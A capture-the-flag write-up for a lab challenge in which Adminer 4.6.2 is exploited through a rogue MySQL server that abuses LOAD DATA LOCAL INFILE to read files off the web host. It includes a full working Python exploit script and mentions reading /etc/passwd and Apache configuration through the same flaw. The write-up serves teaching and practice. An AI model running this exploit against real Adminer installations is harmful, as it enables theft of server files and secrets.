# Experimental Server

## Challenge description

**Points:** 4

```
Hi Senior Researcher,

a group of researchers is preparing a new server for their upcoming project. It is not in production yet, so following the usual convention, the machine has been given an experimental hostname (such as x-<service><year>-<index_in_year>).

Everything seems routine — until the network monitoring team notices something unusual: the server is making suspicious outbound TCP connections to port 3306. Its admins are attending an IEEE event and cannot be disturbed, so it is up to you to find out what is going on.

Stay curious!

The server sits on x-www26-2.nren.tcc
```

## Summary

An experimental web host (`x-www26-2.nren.tcc`) was seen making "suspicious outbound TCP
connections to port 3306". The host runs **Adminer 4.6.2**, vulnerable to the
`LOAD DATA LOCAL INFILE` arbitrary file read (fixed in 4.6.3). Pointing Adminer at an
attacker-controlled **rogue MySQL server** makes it connect out (the suspicious 3306 traffic)
and hand over any file `www-data` can read — including a flag hidden behind an `.htaccess`
`Require all denied` (HTTP 403).

## Solution

### Step 1: Recon — find the pieces

DNS lives at `gw.tcc` (`10.99.0.1`), authoritative for `.tcc`.

```bash
nslookup x-www26-2.nren.tcc 10.99.0.1     # -> 10.99.26.61 (Apache, only port 80)
# brute-force neighbours -> db.nren.tcc (10.99.26.33, MariaDB, auth-protected)
#                           c2.tcc      (10.99.24.24, firewalled from analyst net)
```

The web root is a static "Coming soon" page, but content discovery finds two things:

```bash
curl -s http://10.99.26.61/.env          # DECOY: APP_NAME="Adminer Corp",
                                          # JWT_SECRET base64 -> {"this":"is not real","just":"decoy"}
curl -s http://10.99.26.61/adminer.php    # Adminer 4.6.2  (vulnerable)
```

### Step 2: Rogue MySQL server + Adminer file read

Run a fake MySQL server that answers every query with a `LOAD DATA LOCAL INFILE` request for a
chosen file, then log into Adminer pointing `Server` at our IP. Adminer connects out as
`www-data` and streams the file back. This bypasses the `.htaccess` 403 because the read is on
the filesystem, not over HTTP.

The intended target was discovered by reading config/metadata through the same primitive:
`sites-enabled/adminer.conf` (author note) → `DocumentRoot=/var/www/public`, flag in
`/var/www/public/backup/` (folder name also leaked via root `/.DS_Store`).

```python
#!/usr/bin/env python3
# solve.py — rogue MySQL server that reads one file via Adminer's LOAD DATA LOCAL,
# then triggers Adminer to connect and prints the file (the flag).
# Usage: python3 solve.py
import socket, threading, struct, time, requests

MY_IP   = "10.200.0.36"                               # our address as seen by the target
TARGET  = "http://10.99.26.61/adminer.php"            # vulnerable Adminer 4.6.2
WANT     = "/var/www/public/backup/flag.txt"          # file to steal
RESULT  = {}

def greeting():
    caps = 0x0008A28D                                 # must include CLIENT_LOCAL_FILES (0x80)
    lo, up = caps & 0xFFFF, (caps >> 16) & 0xFFFF
    p  = b"\x0a" + b"5.7.00-rogue\x00" + struct.pack("<I", 0x12345678)
    p += b"ABCDEFGH" + b"\x00" + struct.pack("<H", lo) + b"\x21"
    p += struct.pack("<H", 0x0002) + struct.pack("<H", up) + bytes([21])
    p += b"\x00"*10 + b"IJKLMNOPQRS\x00" + b"mysql_native_password\x00"
    return p

def recv_pkt(s):
    hdr = b""
    while len(hdr) < 4:
        c = s.recv(4-len(hdr));  hdr += c
        if not c: return None, None
    ln, seq = int.from_bytes(hdr[:3], "little"), hdr[3]
    pay = b""
    while len(pay) < ln:
        c = s.recv(ln-len(pay));  pay += c
        if not c: break
    return seq, pay

def send_pkt(s, seq, pay):
    s.sendall(len(pay).to_bytes(3, "little") + bytes([seq]) + pay)

OK = b"\x00\x00\x00\x02\x00\x00\x00"

def handle(s):
    try:
        send_pkt(s, 0, greeting())                    # 1) server handshake
        seq, _ = recv_pkt(s)                           # 2) client login
        send_pkt(s, seq+1, OK)                         # 3) accept any creds
        while True:
            seq, pay = recv_pkt(s)                     # 4) wait for a query
            if not pay: break
            if pay[0] != 0x03:                         # not COM_QUERY -> just OK
                send_pkt(s, seq+1, OK);  continue
            send_pkt(s, seq+1, b"\xfb" + WANT.encode())# 5) LOAD DATA LOCAL INFILE <file>
            data, last = b"", seq+1
            while True:                                # 6) client streams the file
                s2, d = recv_pkt(s)
                if d is None or len(d) == 0:  last = s2 if d is not None else last;  break
                data += d;  last = s2
            if data: RESULT["flag"] = data.decode(errors="replace")
            send_pkt(s, last+1, OK)
    except Exception:
        pass
    finally:
        s.close()

def server():
    srv = socket.socket();  srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 3306));  srv.listen(5)
    while "flag" not in RESULT:
        try: srv.settimeout(1); c, _ = srv.accept()
        except socket.timeout: continue
        threading.Thread(target=handle, args=(c,), daemon=True).start()

threading.Thread(target=server, daemon=True).start()
time.sleep(1)

# Trigger: log into Adminer with Server = our rogue host. The 302 = Adminer connected;
# the follow-up GET issues the queries that pull the file.
sess = requests.Session()
sess.get(TARGET)
sess.post(TARGET, data={
    "auth[driver]": "server", "auth[server]": f"{MY_IP}:3306",
    "auth[username]": "root", "auth[password]": "x", "auth[db]": "",
})
sess.get(TARGET, params={"server": f"{MY_IP}:3306", "username": "root"})

for _ in range(20):
    if "flag" in RESULT: break
    time.sleep(0.5)
print(RESULT.get("flag", "no data — check connectivity / local_infile").strip())
```

Output:

```
FLAG{u2G3-dsoj-nLGS-M9xh}
```

The target's own `backup/.htaccess` confirms the intended path: *"Flag inside can be read only
via Adminer file-read (from the filesystem), not HTTP."*

## Flag

```
FLAG{u2G3-dsoj-nLGS-M9xh}
```

## Notes

- **Vuln:** Adminer < 4.6.3 allows connecting to an arbitrary MySQL host; a malicious server can
  reply with a `LOAD DATA LOCAL INFILE` packet and the PHP `mysqli` client (with `local_infile`
  on) reads the requested file off the Adminer host. This is the "suspicious outbound 3306".
- **Rogue server essentials:** advertise `CLIENT_LOCAL_FILES` in the handshake, accept any login,
  and answer the first real query with `0xFB + filename`.
- **Recon via the same primitive:** before guessing the flag path, the file-read was used to pull
  `/etc/passwd`, `/etc/apache2/...` and `/proc/self/cwd/*` to learn `DocumentRoot=/var/www/public`
  and the `backup/` folder name.
- **Cleanup:** stop the rogue listener and remove any temporary inbound firewall rule for 3306.
```
